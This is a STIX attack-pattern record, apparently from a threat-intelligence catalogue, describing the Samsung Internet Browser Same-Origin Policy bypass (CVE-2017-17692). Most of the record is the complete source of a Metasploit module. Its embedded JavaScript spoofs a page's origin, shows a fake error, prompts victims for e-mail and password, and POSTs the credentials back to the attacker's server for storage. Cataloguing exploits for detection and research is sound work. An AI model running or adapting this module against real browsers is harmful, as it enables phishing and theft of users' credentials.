{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a4395c90-c1fe-41cc-9476-cbae689984ff",
    "created": "2024-08-14T16:32:51.472447Z",
    "modified": "2024-08-14T16:32:51.472451Z",
    "name": "Samsung Internet Browser SOP Bypass",
    "description": "( This module takes advantage of a Same-Origin Policy (SOP) bypass vulnerability in the Samsung Internet Browser, a popular mobile browser shipping with Samsung Android devices. By default, it initiates a redirect to a child tab, and rewrites the innerHTML to gather credentials via a fake pop-up. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/samsung_browser_sop_bypass.rb",
            "external_id": "samsung_browser_sop_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-17692"
        },
        {
            "source_name": "reference",
            "url": "http://fr.0day.today/exploit/description/28434"
        },
        {
            "source_name": "OptString.new(TARGET_URL",
            "external_id": ""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => 'Samsung Internet Browser SOP Bypass',\n        'Description'    => %q(\n          This module takes advantage of a Same-Origin Policy (SOP) bypass vulnerability in the\n          Samsung Internet Browser, a popular mobile browser shipping with Samsung Android devices.\n          By default, it initiates a redirect to a child tab, and rewrites the innerHTML to gather\n          credentials via a fake pop-up.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         => [\n          'Dhiraj Mishra', # Original discovery, disclosure\n          'Tod Beardsley', # Metasploit module\n          'Jeffrey Martin' # Metasploit module\n        ],\n        'References'     => [\n        [ 'CVE', '2017-17692' ],\n        ['URL', 'http://fr.0day.today/exploit/description/28434']\n        ],\n        'DisclosureDate' => '2017-11-08',\n        'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n        'PassiveActions' => [ 'WebServer' ],\n        'DefaultAction'  => 'WebServer'\n      )\n    )\n\n  register_options([\n      OptString.new('TARGET_URL', [\n        true,\n        'The URL to spoof origin from.',\n        'http://example.com/'\n      ]),\n      OptString.new('CUSTOM_HTML', [\n        true,\n        'HTML to display to the victim.',\n        'This page has moved. Please <a href=\"#\">click here</a> to redirect your browser.'\n      ])\n    ])\n\n  register_advanced_options([\n    OptString.new('CUSTOM_JS', [\n      false,\n      \"Custom Javascript to inject as the go() function. Use the variable 'x' to refer to the new tab.\",\n      ''\n    ])\n  ])\n\n  end\n\n  def run\n    exploit # start http server\n  end\n\n  def evil_javascript\n    return datastore['CUSTOM_JS'] unless datastore['CUSTOM_JS'].blank?\n    js = <<-EOS\n      setTimeout(function(){\n        x.document.body.innerHTML='<h1>404 Error</h1>'+\n        '<p>Oops, something went wrong.</p>';\n        a=x.prompt('E-mail','');\n        b=x.prompt('Password','');\n        var cred=JSON.stringify({'user':a,'pass':b});\n        var xmlhttp = new XMLHttpRequest;\n          xmlhttp.open('POST', window.location, true);\n          xmlhttp.send(cred);\n        }, 3000);\n    EOS\n    js\n  end\n\n  def setup\n    @html = <<-EOS\n        <html>\n        <meta charset=\"UTF-8\">\n        <head>\n        <script>\n        function go(){\n          try {\n            var x = window.open('#{datastore['TARGET_URL']}');\n            #{evil_javascript}\n            } catch(e) { }\n          }\n        </script>\n        </head>\n        <body onclick=\"go()\">\n        #{datastore['CUSTOM_HTML']}\n        </body></html>\n      EOS\n  end\n\n  def store_cred(username,password)\n    credential_data = {\n      origin_type: :import,\n      module_fullname: self.fullname,\n      filename: 'msfconsole',\n      workspace_id: myworkspace_id,\n      service_name: 'web_service',\n      realm_value: datastore['TARGET_URL'],\n      realm_key: Metasploit::Model::Realm::Key::WILDCARD,\n      private_type: :password,\n      private_data: password,\n      username: username\n    }\n    create_credential(credential_data)\n  end\n\n  # This assumes the default schema is being used.\n  # If it's not that, it'll just display the collected POST data.\n  def collect_data(request)\n    cred = JSON.parse(request.body)\n    u = cred['user']\n    p = cred['pass']\n    if u.blank? || p.blank?\n      print_good(\"#{cli.peerhost}: POST data received from #{datastore['TARGET_URL']}: #{request.body}\")\n    else\n      print_good(\"#{cli.peerhost}: Collected credential for '#{datastore['TARGET_URL']}' #{u}:#{p}\")\n      store_cred(u,p)\n    end\n  end\n\n  def on_request_uri(cli, request)\n    case request.method.downcase\n    when 'get' # initial connection\n      print_status(\"#{cli.peerhost}: Request '#{request.method} #{request.uri}'\")\n      print_status(\"#{cli.peerhost}: Attempting to spoof origin for #{datastore['TARGET_URL']}\")\n      send_response(cli, @html)\n    when 'post' # must have fallen for it\n      collect_data(request)\n    else\n      print_error(\"#{cli.peerhost}: Unhandled method: #{request.method}\")\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2017-11-08"
}